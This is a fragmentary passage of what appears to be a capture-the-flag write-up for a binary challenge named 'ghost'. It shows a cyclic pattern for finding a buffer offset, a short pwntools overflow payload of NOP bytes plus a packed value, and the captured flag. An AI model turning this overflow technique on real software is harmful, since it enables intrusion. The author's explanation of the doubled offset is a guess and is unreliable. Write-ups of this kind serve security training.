...
...                                                                                                           
ghost code: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa                      
...
payload = flat(
    b"\x90" * offset * 2, # "Offset * 2" I Believe Because x64 Arch...
    pack(value)
)
...
> Flag: BDSEC{You_have_been_haunted_by_a_ghost!}
{: .prompt-tip }
